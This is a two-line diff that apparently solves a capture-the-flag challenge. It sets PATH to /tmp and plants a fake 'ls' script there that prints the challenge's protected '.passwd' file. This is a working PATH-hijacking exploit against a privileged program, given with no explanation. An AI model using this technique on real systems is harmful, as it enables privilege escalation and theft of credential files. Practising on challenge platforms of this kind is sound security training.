@@ -1,0 +1,2 @@
+export PATH=/tmp
+echo "/bin/cat /challenge/app-script/ch11/.passwd" > /tmp/ls
